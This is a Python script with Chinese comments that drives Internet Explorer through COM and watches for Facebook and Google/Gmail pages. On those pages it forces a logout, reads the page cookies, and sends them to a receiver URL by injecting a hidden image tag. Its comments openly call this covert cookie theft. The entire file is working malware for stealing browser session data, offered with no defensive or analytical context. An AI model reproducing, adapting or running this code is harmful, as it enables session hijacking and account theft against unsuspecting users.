import win32com.client
import time
import urllib.parse
import sys

# 数据接收服务器的 URL
data_receiver = "http://127.0.0.1:8080/log"

# 目标网站配置字典
target_sites = {
    "www.facebook.com": {
        "logout_url": None,  # 登出 URL（无则为 None）
        "logout_form": "logout_form",  # 登出表单的 ID
        "owned": False  # 是否已处理过该网站
    },
    "accounts.google.com": {
        "logout_url": "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail%26passive%3Dtrue%26rm%3Dfalse%26continue%3Dhttps%253A%252F%252Fmail.google.com%252Fmail%252F&followup=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
        "logout_form": None,  # 无登出表单
        "owned": False
    },
    "www.gmail.com": None,  # 指向 accounts.google.com 配置
    "mail.google.com": None  # 指向 accounts.google.com 配置
}

# 设置 Gmail 和 mail.google.com 的配置引用
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

# Internet Explorer 的 CLSID
clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

def wait_for_browser(browser):
    """
    等待浏览器页面加载完成
    参数:
        browser: Internet Explorer COM 对象
    """
    try:
        while browser.ReadyState != 4 and browser.ReadyState != "complete":
            time.sleep(0.1)
    except Exception as e:
        print(f"[错误] 等待浏览器加载失败: {e}")

def inject_image_tag(browser, cookies):
    """
    动态插入隐藏的 <img> 标签，将 Cookies 编码到 src URL 参数中
    参数:
        browser: Internet Explorer COM 对象
        cookies: 页面 Cookies 字符串
    """
    try:
        # URL 编码 Cookies
        encoded_cookies = urllib.parse.quote(cookies)
        # 构造图片标签的 src URL
        img_src = f"{data_receiver}?c={encoded_cookies}"
        
        # 创建 JavaScript 代码，插入隐藏的 <img> 标签
        js_code = f"""
        var img = document.createElement('img');
        img.src = '{img_src}';
        img.style.display = 'none';
        document.body.appendChild(img);
        """
        
        # 执行 JavaScript 代码
        browser.Document.parentWindow.execScript(js_code)
        print(f"[成功] 已注入图片标签，Cookies 已发送到 {data_receiver}")
        
    except Exception as e:
        print(f"[错误] 注入图片标签失败: {e}")

def main():
    """
    主函数，监控浏览器并通过图片标签隐蔽窃取 Cookies
    """
    try:
        # 初始化 Internet Explorer COM 对象
        windows = win32com.client.Dispatch(clsid)
        
        while True:
            try:
                # 遍历所有打开的 IE 窗口
                for browser in windows:
                    try:
                        # 解析当前页面 URL
                        url = urllib.parse.urlparse(browser.LocationURL)
                        hostname = url.hostname
                        
                        # 检查是否为目标网站
                        if hostname and hostname in target_sites:
                            if target_sites[hostname]["owned"]:
                                continue
                            
                            # 处理登出逻辑
                            if target_sites[hostname]["logout_url"]:
                                browser.Navigate(target_sites[hostname]["logout_url"])
                                wait_for_browser(browser)
                            elif target_sites[hostname]["logout_form"]:
                                full_doc = browser.Document.all
                                for elem in full_doc:
                                    try:
                                        if elem.id == target_sites[hostname]["logout_form"]:
                                            elem.click()
                                            wait_for_browser(browser)
                                    except:
                                        pass
                            
                            # 提取 Cookies 并通过图片标签发送
                            try:
                                cookies = browser.Document.cookie
                                if cookies:
                                    inject_image_tag(browser, cookies)
                                    target_sites[hostname]["owned"] = True
                            except Exception as e:
                                print(f"[错误] 提取 Cookies 失败: {e}")
                            
                    except Exception as e:
                        print(f"[错误] 处理浏览器窗口失败: {e}")
                
                # 每 5 秒检查一次
                time.sleep(5)
            
            except Exception as e:
                print(f"[错误] 主循环错误: {e}")
                time.sleep(5)  # 发生错误后等待 5 秒重试
                
    except Exception as e:
        print(f"[错误] 初始化失败: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()